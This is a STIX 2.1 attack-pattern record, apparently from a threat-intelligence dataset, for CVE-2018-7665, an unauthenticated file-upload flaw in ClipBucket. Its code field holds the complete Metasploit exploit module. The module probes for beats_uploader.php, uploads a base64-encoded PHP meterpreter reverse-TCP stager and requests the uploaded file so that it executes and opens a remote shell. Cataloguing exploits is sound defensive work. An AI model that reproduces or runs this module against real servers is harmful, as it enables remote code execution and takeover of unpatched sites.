{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d217bee0-21a3-420b-b1ae-c3c042fbc5fc",
    "created": "2024-08-14T17:09:26.529117Z",
    "modified": "2024-08-14T17:09:26.52912Z",
    "name": "\"ClipBucket beats_uploader Unauthenticated Arbitrary File Upload\"",
    "description": " This module exploits a vulnerability found in ClipBucket versions before 4.0.0 (Release 4902). A malicious file can be uploaded using an unauthenticated arbitrary file upload vulnerability. It is possible for an attacker to upload a malicious script to issue operating system commands. This issue is caused by improper session handling in /action/beats_uploader.php file. This module was tested on ClipBucket before 4.0.0 - Release 4902 on Windows 7 and Kali Linux.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/clipbucket_fileupload_exec.rb",
            "external_id": "clipbucket_fileupload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-7665"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ClipBucket beats_uploader Unauthenticated Arbitrary File Upload\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in ClipBucket versions before 4.0.0 (Release 4902).\n        A malicious file can be uploaded using an unauthenticated arbitrary file upload vulnerability.\n        It is possible for an attacker to upload a malicious script to issue operating system commands.\n        This issue is caused by improper session handling in /action/beats_uploader.php file.\n        This module was tested on ClipBucket before 4.0.0 - Release 4902 on Windows 7 and Kali Linux.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'www.sec-consult.com', # Vulnerability Discovery, PoC\n          'Touhid M.Shaikh <admin[at]touhidshaikh.com>' # Metasploit module\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2018-7665' ],\n          [ 'EDB', '44250' ]\n        ],\n      'DefaultOptions' =>\n          {\n            'SSL'     => false,\n            'PAYLOAD' => 'php/meterpreter/reverse_tcp',\n            'Encoder' => 'php/base64'\n          },\n      'Platform'        => ['php'],\n      'Arch'            => ARCH_PHP,\n      'Targets'         =>\n        [\n          ['Clipbucket < 4.0.0 - Release 4902', {}]\n        ],\n      'Privileged'      => false,\n      'DisclosureDate'  => '2018-03-03',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n       OptString.new('TARGETURI', [true, 'The base path to the ClipBucket application', '/'])\n      ])\n  end\n\n  def uri\n    return target_uri.path\n  end\n\n  def check\n    vprint_status('Trying to detect ClipBucket on target.')\n\n    # check for readme file\n    res = send_request_cgi({\n     'method' => 'GET',\n     'uri'    => normalize_uri(uri, 'readme')\n    })\n\n    unless res\n      vprint_error('Connection failed')\n      return CheckCode::Unknown\n    end\n\n    unless res.code == 200 && res.body.include?('ClipBucket')\n      vprint_error('Could not find readme')\n      return CheckCode::Safe\n    end\n\n    # check for beats_uploader.php file\n    res = send_request_cgi({\n        'method' => 'GET',\n        'uri'    => normalize_uri(uri, 'actions', 'beats_uploader.php')\n    })\n\n    unless res\n      vprint_error('Connection failed')\n      return CheckCode::Unknown\n    end\n\n    unless res.code == 200\n      vprint_error('Could not find beats_uploader.php')\n      return CheckCode::Safe\n    end\n\n    Exploit::CheckCode::Appears\n  end\n\n  def exploit\n\n    # generate the PHP meterpreter payload\n    stager = '<?php '\n    stager << payload.encode\n    stager << '?>'\n\n    # Setting POST data\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(stager, content_type = 'application/octet-stream', transfer_encoding = nil, content_disposition = 'form-data; name=\"file\"; filename=\"pfile.php\"') # payload\n    post_data.add_part('1', content_type = nil, transfer_encoding = nil, content_disposition = 'form-data; name=\"plupload\"') # require for uploading\n    post_data.add_part('agent22.php', content_type = nil, transfer_encoding = nil, content_disposition = 'form-data; name=\"name\"')\n    data = post_data.to_s\n\n\n    print_status('Uploading payload..')\n    res = send_request_cgi({\n        'method' => 'POST',\n        'uri'    => normalize_uri(uri, 'actions', 'beats_uploader.php'),\n        'data'  => data,\n        'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n\n    jsonres = res.get_json_document\n\n    # If the server returns 200 and success yes, we assume we uploaded the malicious\n    # file successfully\n    unless res && res.code == 200 && jsonres['success'] == 'yes'\n      fail_with(Failure::None, \"#{peer} - File wasn't uploaded, aborting!\")\n    end\n    print_good('Looking For Payload..')\n    pdir = jsonres['file_directory']\n    file_name = jsonres['file_name']\n    pext = jsonres['extension']\n    print_good(\"found payload in /actions/#{pdir}/#{file_name}.#{pext}\")\n\n    # Payload name\n    pname = \"#{file_name}.php\"\n\n    # Cleanup is Good Idea .\n    register_files_for_cleanup(pname)\n\n    print_status(\"Executing Payload [ #{uri}/actions/#{pdir}/#{pname} ]\" )\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, 'actions', pdir, pname)\n    })\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have a shell, either.\n    if res && res.code != 200\n      print_error('Unexpected response, probably the exploit failed')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-03-03",
    "x_mitre_platforms": [
        "['php']"
    ]
}